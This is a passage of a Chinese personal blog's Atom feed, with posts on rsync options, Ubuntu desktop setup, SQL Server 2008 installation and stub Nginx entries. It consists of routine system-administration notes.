/swapfile</span></span><br></pre></td></tr></tbody></table></figure><p>&#x4ECE;<code>/etc/fstab</code>&#x5220;&#x9664;swap&#x9879;&#x76EE;&#xFF0C;&#x4F7F;&#x7528;fdisk&#x6216;yast&#x5DE5;&#x5177;&#x5220;&#x9664;&#x5206;&#x533A;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;&amp;#x6269;&amp;#x5C55;&amp;#x4EA4;&amp;#x6362;&amp;#x5206;&amp;#x533A;&quot;&gt;&lt;a href=&quot;#&amp;#x6269;&amp;#x5C55;&amp;#x4EA4;&amp;#x6362;&amp;#x5206;&amp;#x533A;&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx访问控制</title>
    <link href="https://marnm.github.io//posts/d4e5e907/"/>
    <id>https://marnm.github.io//posts/d4e5e907/</id>
    <published>2022-06-03T04:38:08.000Z</published>
    <updated>2022-06-07T03:15:25.890Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Nginx日志管理</title>
    <link href="https://marnm.github.io//posts/2793eb31/"/>
    <id>https://marnm.github.io//posts/2793eb31/</id>
    <published>2022-06-02T02:29:20.000Z</published>
    <updated>2022-06-02T02:32:13.270Z</updated>
    
    <content type="html"><![CDATA[<script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;script&gt;
        document.querySelectorAll(&#39;.github-emoji&#39;)
          .forEach(el =&gt; {
            if (!el.dataset.src) { return; }
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>rsync数据同步</title>
    <link href="https://marnm.github.io//posts/3c7a2415/"/>
    <id>https://marnm.github.io//posts/3c7a2415/</id>
    <published>2022-05-03T14:16:38.000Z</published>
    <updated>2022-05-03T14:17:03.557Z</updated>
    
    <content type="html"><![CDATA[<h2 id="rsync&#x57FA;&#x7840;"><a href="#rsync&#x57FA;&#x7840;" class="headerlink" title="rsync&#x57FA;&#x7840;"></a>rsync&#x57FA;&#x7840;</h2><p><strong>rsync&#x547D;&#x4EE4;</strong> &#x662F;&#x4E00;&#x4E2A;&#x8FDC;&#x7A0B;&#x6570;&#x636E;&#x540C;&#x6B65;&#x5DE5;&#x5177;&#xFF0C;&#x53EF;&#x901A;&#x8FC7;LAN/WAN&#x5FEB;&#x901F;&#x540C;&#x6B65;&#x591A;&#x53F0;&#x4E3B;&#x673A;&#x95F4;&#x7684;&#x6587;&#x4EF6;&#x3002;rsync&#x4F7F;&#x7528;&#x6240;&#x8C13;&#x7684;&#x201C;rsync&#x7B97;&#x6CD5;&#x201D;&#x6765;&#x4F7F;&#x672C;&#x5730;&#x548C;&#x8FDC;&#x7A0B;&#x4E24;&#x4E2A;&#x4E3B;&#x673A;&#x4E4B;&#x95F4;&#x7684;&#x6587;&#x4EF6;&#x8FBE;&#x5230;&#x540C;&#x6B65;&#xFF0C;&#x8FD9;&#x4E2A;&#x7B97;&#x6CD5;&#x53EA;&#x4F20;&#x9001;&#x4E24;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x4E0D;&#x540C;&#x90E8;&#x5206;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x6BCF;&#x6B21;&#x90FD;&#x6574;&#x4EFD;&#x4F20;&#x9001;&#xFF0C;&#x56E0;&#x6B64;&#x901F;&#x5EA6;&#x76F8;&#x5F53;&#x5FEB;&#x3002; rsync&#x662F;&#x4E00;&#x4E2A;&#x529F;&#x80FD;&#x975E;&#x5E38;&#x5F3A;&#x5927;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x5176;&#x547D;&#x4EE4;&#x4E5F;&#x6709;&#x5F88;&#x591A;&#x529F;&#x80FD;&#x7279;&#x8272;&#x9009;&#x9879;&#xFF0C;&#x6211;&#x4EEC;&#x4E0B;&#x9762;&#x5C31;&#x5BF9;&#x5B83;&#x7684;&#x9009;&#x9879;&#x4E00;&#x4E00;&#x8FDB;&#x884C;&#x5206;&#x6790;&#x8BF4;&#x660E;&#x3002;</p><a id="more"></a><h3 id="&#x4E00;&#x3001;rsync&#x547D;&#x4EE4;"><a href="#&#x4E00;&#x3001;rsync&#x547D;&#x4EE4;" class="headerlink" title="&#x4E00;&#x3001;rsync&#x547D;&#x4EE4;"></a>&#x4E00;&#x3001;rsync&#x547D;&#x4EE4;</h3><blockquote><p><strong>&#x57FA;&#x672C;&#x683C;&#x5F0F;&#xFF1A;</strong> </p><blockquote><p> <code>rsync [option] &#x539F;&#x59CB;&#x4F4D;&#x7F6E; &#x76EE;&#x6807;&#x4F4D;&#x7F6E;</code></p></blockquote></blockquote><p><strong>&#x5E38;&#x7528;&#x9009;&#x9879;&#xFF1A;</strong></p><pre><code>-a        &#x5F52;&#x6863;&#x6A21;&#x5F0F;&#xFF0C;&#x9012;&#x5F52;&#x5E76;&#x4FDD;&#x7559;&#x5BF9;&#x8C61;&#x5C5E;&#x6027;&#xFF0C;&#x7B49;&#x540C;&#x4E8E;-rlptgoD-v        &#x663E;&#x793A;&#x540C;&#x6B65;&#x8FC7;&#x7A0B;&#x8BE6;&#x7EC6;(verbose)&#x4FE1;&#x606F;-z        &#x5728;&#x4F20;&#x8F93;&#x6587;&#x4EF6;&#x65F6;&#x8FDB;&#x884C;&#x538B;&#x7F29;(compress)-H        &#x4FDD;&#x7559;&#x786C;&#x8FDE;&#x63A5;&#x6587;&#x4EF6;-A        &#x4FDD;&#x7559;ACL&#x5C5E;&#x6027;--delete  &#x5220;&#x9664;&#x76EE;&#x6807;&#x4F4D;&#x7F6E;&#x6709;&#x800C;&#x539F;&#x59CB;&#x4F4D;&#x7F6E;&#x6CA1;&#x6709;&#x7684;&#x6587;&#x4EF6;-r        &#x9012;&#x5F52;&#x6A21;&#x5F0F;&#xFF0C;&#x5305;&#x542B;&#x76EE;&#x5F55;&#x53CA;&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x6240;&#x6709;&#x6587;&#x4EF6;-l        &#x5BF9;&#x4E8E;&#x8F6F;&#x94FE;&#x63A5;&#x6587;&#x4EF6;&#x4ECD;&#x7136;&#x590D;&#x5236;&#x4E3A;&#x8F6F;&#x94FE;&#x63A5;&#x6587;&#x4EF6;-p        &#x4FDD;&#x7559;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x6807;&#x8BB0;-t        &#x4FDD;&#x7559;&#x6587;&#x4EF6;&#x7684;&#x65F6;&#x95F4;&#x6807;&#x8BB0;-g        &#x4FDD;&#x7559;&#x6587;&#x4EF6;&#x7684;&#x5C5E;&#x7EC4;&#x6807;&#x8BB0;&#xFF08;&#x4EC5;&#x8D85;&#x7EA7;&#x7528;&#x6237;&#x4F7F;&#x7528;-o        &#x4FDD;&#x7559;&#x6587;&#x4EF6;&#x5C5E;&#x4E3B;&#x6807;&#x8BB0;&#xFF08;&#x4EC5;&#x8D85;&#x7EA7;&#x7528;&#x6237;&#x4F7F;&#x7528;-D        &#x4FDD;&#x7559;&#x8BBE;&#x5907;&#x6587;&#x4EF6;&#x53CA;&#x5176;&#x4ED6;&#x7279;&#x6B8A;&#x6587;&#x4EF6;</code></pre><h2 id="&#x914D;&#x7F6E;rsync"><a href="#&#x914D;&#x7F6E;rsync" class="headerlink" title="&#x914D;&#x7F6E;rsync"></a>&#x914D;&#x7F6E;rsync</h2><h2 id="&#x672C;&#x673A;&#x540C;&#x6B65;&#x4E0E;&#x8FDC;&#x7A0B;&#x540C;&#x6B65;"><a href="#&#x672C;&#x673A;&#x540C;&#x6B65;&#x4E0E;&#x8FDC;&#x7A0B;&#x540C;&#x6B65;" class="headerlink" title="&#x672C;&#x673A;&#x540C;&#x6B65;&#x4E0E;&#x8FDC;&#x7A0B;&#x540C;&#x6B65;"></a>&#x672C;&#x673A;&#x540C;&#x6B65;&#x4E0E;&#x8FDC;&#x7A0B;&#x540C;&#x6B65;</h2><h2 id="&#x7CFB;&#x7EDF;&#x670D;&#x52A1;&#x811A;&#x672C;"><a href="#&#x7CFB;&#x7EDF;&#x670D;&#x52A1;&#x811A;&#x672C;" class="headerlink" title="&#x7CFB;&#x7EDF;&#x670D;&#x52A1;&#x811A;&#x672C;"></a>&#x7CFB;&#x7EDF;&#x670D;&#x52A1;&#x811A;&#x672C;</h2><h2 id="&#x7ED3;&#x5408;inotify&#x662F;&#x5B9E;&#x65F6;&#x540C;&#x6B65;"><a href="#&#x7ED3;&#x5408;inotify&#x662F;&#x5B9E;&#x65F6;&#x540C;&#x6B65;" class="headerlink" title="&#x7ED3;&#x5408;inotify&#x662F;&#x5B9E;&#x65F6;&#x540C;&#x6B65;"></a>&#x7ED3;&#x5408;inotify&#x662F;&#x5B9E;&#x65F6;&#x540C;&#x6B65;</h2><h2 id="srync&#x6258;&#x7BA1;xinetd"><a href="#srync&#x6258;&#x7BA1;xinetd" class="headerlink" title="srync&#x6258;&#x7BA1;xinetd"></a>srync&#x6258;&#x7BA1;xinetd</h2><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;rsync基础&quot;&gt;&lt;a href=&quot;#rsync基础&quot; class=&quot;headerlink&quot; title=&quot;rsync基础&quot;&gt;&lt;/a&gt;rsync基础&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;rsync命令&lt;/strong&gt; 是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。rsync使用所谓的“rsync算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。 rsync是一个功能非常强大的工具，其命令也有很多功能特色选项，我们下面就对它的选项一一进行分析说明。&lt;/p&gt;
    
    </summary>
    
      <category term="运维" scheme="https://marnm.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="CTF" scheme="https://marnm.github.io/tags/CTF/"/>
    
      <category term="信息安全" scheme="https://marnm.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="网络空间安全" scheme="https://marnm.github.io/tags/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8/"/>
    
      <category term="Python" scheme="https://marnm.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu Desktop优化与配置</title>
    <link href="https://marnm.github.io//posts/e76ba468/"/>
    <id>https://marnm.github.io//posts/e76ba468/</id>
    <published>2021-11-10T07:23:44.000Z</published>
    <updated>2022-05-27T01:38:27.437Z</updated>
    
    <content type="html"><![CDATA[<h4 id="vmtools"><a href="#vmtools" class="headerlink" title="vmtools"></a>vmtools</h4><p>&#x5982;&#x679C;&#x5728;VMware&#x865A;&#x62DF;&#x673A;&#x91CC;&#x9762;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;open-vm-tools&#xFF0C;&#x8FD9;&#x662F;&#x539F;&#x6765;&#x7684;vmtools&#x901A;&#x8FC7;&#x5F00;&#x6E90;&#x51FA;&#x6765;&#x7684;&#x7248;&#x672C;&#x800C;&#x5DF2;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install open-vm-tools open-vm-tools-desktop</span><br></pre></td></tr></tbody></table></figure><a id="more"></a><h4 id="gnome-teawk-tool"><a href="#gnome-teawk-tool" class="headerlink" title="gnome-teawk-tool"></a>gnome-teawk-tool</h4><p>&#x5B89;&#x88C5;gnome-tweak&#x4FEE;&#x6539;DPI&#x3001;&#x4E3B;&#x9898;&#x3001;&#x56FE;&#x6807;</p><figure class="highlight sh"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gnome-tweak-tool</span><br></pre></td></tr></tbody></table></figure><h4 id="&#x5B89;&#x88C5;gnome&#x63D2;&#x4EF6;"><a href="#&#x5B89;&#x88C5;gnome&#x63D2;&#x4EF6;" class="headerlink" title="&#x5B89;&#x88C5;gnome&#x63D2;&#x4EF6;"></a>&#x5B89;&#x88C5;gnome&#x63D2;&#x4EF6;</h4><p>&#x63D2;&#x4EF6;&#x5730;&#x5740;<a href="https://extensions.gnome.org/" target="_blank" rel="noopener">URL</a>&#x3002;&#x8981;&#x4FEE;&#x6539;gnome-shell&#xFF0C;&#x8BB0;&#x5F97;&#x5148;&#x5B89;&#x88C5;User Themse&#x63D2;&#x4EF6;</p><p>Ubuntu &#x7684;&#x914D;&#x7F6E;<br>&#x4FEE;&#x6539;&#x955C;&#x50CF;&#x6E90;/etc/apt/source.list</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></tbody></table></figure><p>&#x8FDB;&#x5165;&#x8BBE;&#x7F6E;&#x9762;&#x677F;-&#x66F4;&#x65B0;&#x8F93;&#x5165;&#x6CD5;&#x914D;&#x7F6E;</p><p>&#x7F8E;&#x5316;<br><code>sudo apt install gnome-tweaks</code> &#x6216;<code></code>gnome-tweak-tool<code>&#x6D4F;&#x89C8;&#x5668;&#x63D2;&#x4EF6;</code>chrome-gnome-shell<code></code>User Themes<code>&#xFF0C;</code>Dash to Dock<code></code>gnome-shell-extensions<code>&#x5B89;&#x88C5;&#x4E3B;&#x9898;shell: .local/share/theme</code>&#x76EE;&#x5F55;&#x4E0B;<br>&#x56FE;&#x6807; .local/share/icons<br>&#x5B57;&#x4F53; .local/share/fonts</p><p>&#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&#xFF0C;&#x8FDB;&#x5165;&#x5B98;&#x7F51;&#x4E0B;&#x8F7D;&#x5373;&#x53EF;<br>Google Chrome&#x3001;&#x641C;&#x72D7;&#x8F93;&#x5165;&#x6CD5;&#x3001;WPS</p><p>WPS&#x82E5;&#x6709;&#x5B57;&#x4F53;&#x7F3A;&#x5931;&#x95EE;&#x9898;<br>&#x4E0B;&#x8F7D;&#x7F3A;&#x5931;&#x5B57;&#x4F53;&#x6587;&#x4EF6;&#x5305;&#xFF0C;&#x89E3;&#x538B;&#x5230;<br><code>sudo mv * /usr/share/fonts</code><br>&#x751F;&#x6210;&#x5B57;&#x4F53;&#x7D22;&#x5F15;&#x4FE1;&#x606F;<br><code>sudo mkfontscale</code><br><code>sudo mkfontdir</code><br>&#x66F4;&#x65B0;&#x5B57;&#x4F53;&#x7F13;&#x5B58;<br><code>sudo fc-cache</code></p><p>&#x4E00;&#x4E9B;&#x5E38;&#x7528;&#x547D;&#x4EE4;&#x5DE5;&#x5177;<br>git&#x3001;curl&#x3001;net-tools&#x3001;vim&#x3001;emacs&#x3001;tree&#x3001;nmap</p><p>sudo&#x514D;&#x5BC6;&#x7801;(abc&#x662F;&#x7528;&#x6237;&#x540D;&#xFF09;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo visudo</span><br><span class="line">abc ALL=(ALL) NOPASSWD: ALL</span><br></pre></td></tr></tbody></table></figure><p>&#x5F00;&#x53D1;&#x73AF;&#x5883;<br>JAVA<br>open-jdk:<br><code>apt install openjdk-8-jdk</code><br><code>apt install openjdk-8-source</code></p><p>oracle-jdk<br>&#x5B98;&#x7F51;&#x4E0B;&#x8F7D;JDK<br><code>sudo tar -zxvf jdk-8-xxx.tar.gz -C /usr/</code><br>&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x914D;&#x7F6E;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; ~/.bashrc &lt;&lt;- &quot;EOF&quot;</span><br><span class="line">export JAVA_HOME=/usr/jdk-xxxx...</span><br><span class="line">export PATH=$JAVA_HOME/bin/$PATH</span><br><span class="line">EOF</span><br><span class="line"></span><br><span class="line">source ~/.bashrc</span><br></pre></td></tr></tbody></table></figure><p>Qv2ray&#x6838;&#x5FC3;&#x6587;&#x4EF6;&#x914D;&#x7F6E;<br>&#x7531;&#x4E8E;&#x67D0;&#x4E9B;&#x4F17;&#x6240;&#x5468;&#x77E5;&#x7684;&#x653F;&#x7B56;&#x539F;&#x56E0;&#xFF0C;Qv2ray &#x672C;&#x8EAB;&#x5E76; &#x4E0D;&#x5305;&#x542B; V2Ray &#x6838;&#x5FC3;&#x53EF;&#x6267;&#x884C;&#x6587;&#x4EF6;&#x3002;&#x8FD9;&#x4E9B;&#x6838;&#x5FC3;&#x6587;&#x4EF6;&#x6765;&#x81EA;&#x4E00;&#x4E2A;&#x53EB;&#x505A; v2ray-core &#x7684;&#x9879;&#x76EE;&#xFF0C;&#x9700;&#x8981;&#x7528;&#x6237;&#x624B;&#x52A8;&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#x5230;&#x6307;&#x5B9A;&#x4F4D;&#x7F6E;&#x3002;<br>&#x9879;&#x76EE;&#x5730;&#x5740;<a href="https://github.com/v2fly/v2ray-core/releases" target="_blank" rel="noopener">https://github.com/v2fly/v2ray-core/releases</a><br>&#x5C06;&#x89E3;&#x538B;&#x51FA;&#x6765;&#x7684;&#x6838;&#x5FC3;&#x6587;&#x4EF6;&#x653E;&#x5230;.config/qv2ray/vcore&#x4E0B;<br>v2ray | v2ctl | geoip.dat | geosite.dat &#xFF08;&#x8FD9;&#x51E0;&#x4E2A;&#x5FC5;&#x987B;&#xFF09;</p><p>&#x51FA;&#x73B0;&#x5F88;&#x591A;&#x547D;&#x4EE4;&#x4E22;&#x5931;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x547D;&#x4EE4;&#x65E0;&#x6CD5;&#x4F7F;&#x7528;<br>&#x5728;/etc/profile&#x6216;&#x8005;.bashrc&#x6DFB;&#x52A0;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games&quot;</span><br><span class="line">source profile </span><br><span class="line">source .bashrc</span><br></pre></td></tr></tbody></table></figure><p>&#x7ED9;snap&#x8BBE;&#x7F6E;&#x4EE3;&#x7406;&#xFF0C;&#x6CE8;&#x610F;&#x5730;&#x5740;&#x4E0D;&#x80FD;&#x5E26;https<br>&#x542F;&#x52A8;vpn&#x540E;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[user@lc]_ sudo snap set system proxy.http=&quot;http://&lt;proxy_addr&gt;:&lt;proxy_port&gt;&quot; </span><br><span class="line">[user@lc]_ sudo snap set system proxy.https=&quot;http://&lt;proxy_addr&gt;:&lt;proxy_port&gt;&quot;</span><br></pre></td></tr></tbody></table></figure><p>&#x4F8B;&#x5982;</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo snap set system proxy.http=&quot;http://127.0.0.1:8889&quot;</span><br><span class="line">sudo snap set system proxy.https=&quot;http:127.0.0.1:8889&quot;</span><br></pre></td></tr></tbody></table></figure><p>&#x5B89;&#x88C5;Pycharm<br><code>sudo tar -zxvf xxx.tar.gz -C /opt/</code></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;vmtools&quot;&gt;&lt;a href=&quot;#vmtools&quot; class=&quot;headerlink&quot; title=&quot;vmtools&quot;&gt;&lt;/a&gt;vmtools&lt;/h4&gt;&lt;p&gt;如果在VMware虚拟机里面，可以用open-vm-tools，这是原来的vmtools通过开源出来的版本而已&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo apt-get install open-vm-tools open-vm-tools-desktop&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>SQL Server 2008安装配置</title>
    <link href="https://marnm.github.io//posts/c45f2736/"/>
    <id>https://marnm.github.io//posts/c45f2736/</id>
    <published>2021-03-25T11:08:40.000Z</published>
    <updated>2022-05-27T01:38:48.225Z</updated>
    
    <content type="html"><![CDATA[<h3 id="&#x7CFB;&#x7EDF;&#x8981;&#x6C42;"><a href="#&#x7CFB;&#x7EDF;&#x8981;&#x6C42;" class="headerlink" title="&#x7CFB;&#x7EDF;&#x8981;&#x6C42;"></a>&#x7CFB;&#x7EDF;&#x8981;&#x6C42;</h3><p>&#x5B98;&#x7F51;&#x7684;&#x6700;&#x4F4E;&#x8981;&#x6C42;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="../img/sqlsrv2008_system-requirements.png" alt="SQL Server 2008 System Requirements" title="">                </div>                <div class="image-caption">SQL Server 2008 System Requirements</div>            </figure><a id="more"></a><h3 id="&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;"><a href="#&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;" class="headerlink" title="&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;"></a>&#x5B89;&#x88C5;&#x8FC7;&#x7A0B;</h3><!--more--><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\install.png" alt="Install Check" title="">                </div>                <div class="image-caption">Install Check</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\enter_key.png" alt="Enter Key" title="">                </div>                <div class="image-caption">Enter Key</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\accept_license.png" alt="Accept License" title="">                </div>                <div class="image-caption">Accept License</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\click_install.png" alt="Click Install" title="">                </div>                <div class="image-caption">Click Install</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\next_step.png" alt="Next Step" title="">                </div>                <div class="image-caption">Next Step</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\default.png" alt="Default Select All" title="">                </div>                <div class="image-caption">Default Select All</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\defaultID.png" alt="Default" title="">                </div>                <div class="image-caption">Default</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\server_config.png" alt="Server Config" title="">                </div>                <div class="image-caption">Server Config</div>            </figure><p>&#x8FD9;&#x91CC;&#x53EF;&#x9009;&#x62E9;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x3010;Windows&#x8EAB;&#x4EFD;&#x9A8C;&#x8BC1;&#x6A21;&#x5F0F;&#x3011;&#xFF0C;&#x7136;&#x540E;&#x3010;&#x6DFB;&#x52A0;&#x5F53;&#x524D;&#x7528;&#x6237;&#x3011;&#x4E3A;&#x7BA1;&#x7406;&#x5458;&#xFF1A;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\sqlengine_conf.png" alt="SQL Server Engine Config" title="">                </div>                <div class="image-caption">SQL Server Engine Config</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\Analysis_Services.png" alt="Analysis Server Configure" title="">                </div>                <div class="image-caption">Analysis Server Configure</div>            </figure><p>&#x540E;&#x9762;&#x7684;&#x57FA;&#x672C;&#x5168;&#x90E8;&#x9ED8;&#x8BA4;&#x3010;&#x4E0B;&#x4E00;&#x6B65;&#x3011;&#xFF0C;&#x7B49;&#x5F85;&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#xFF1A;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\installing.png" alt="Install" title="">                </div>                <div class="image-caption">Install</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\Installed.png" alt="Installed" title="">                </div>                <div class="image-caption">Installed</div>            </figure><h3 id="&#x914D;&#x7F6E;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;"><a href="#&#x914D;&#x7F6E;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;" class="headerlink" title="&#x914D;&#x7F6E;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;"></a>&#x914D;&#x7F6E;&#x8FDC;&#x7A0B;&#x8FDE;&#x63A5;</h3><p>&#x6253;&#x5F00;&#x6570;&#x636E;&#x5E93;&#x5C5E;&#x6027;&#xFF1A;</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\remote1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\remote2.png" alt="Security" title="">                </div>                <div class="image-caption">Security</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\remote3.png" alt="Enable Connection" title="">                </div>                <div class="image-caption">Enable Connection</div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="D:\Settings\library\Document\article\remote4.png" alt="Enable TCP/IP" title="">                </div>                <div class="image-caption">Enable TCP/IP</div>            </figure><p>&#x5982;&#x679C;Windows&#x542F;&#x7528;&#x4E86;&#x9632;&#x706B;&#x5899;&#xFF0C;&#x8BF7;&#x5141;&#x8BB8;<code>1433</code>&#x7AEF;&#x53E3;&#x51FA;&#x5165;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;系统要求&quot;&gt;&lt;a href=&quot;#系统要求&quot; class=&quot;headerlink&quot; title=&quot;系统要求&quot;&gt;&lt;/a&gt;系统要求&lt;/h3&gt;&lt;p&gt;官网的最低要求&lt;/p&gt;
&lt;figure class=&quot;image-bubble&quot;&gt;
                &lt;div class=&quot;img-lightbox&quot;&gt;
                    &lt;div class=&quot;overlay&quot;&gt;&lt;/div&gt;
                    &lt;img src=&quot;../img/sqlsrv2008_system-requirements.png&quot; alt=&quot;SQL Server 2008 System Requirements&quot; title=&quot;&quot;&gt;
                &lt;/div&gt;
                &lt;div class=&quot;image-caption&quot;&gt;SQL Server 2008 System Requirements&lt;/div&gt;
            &lt;/figure&gt;
    
    </summary>
    
    
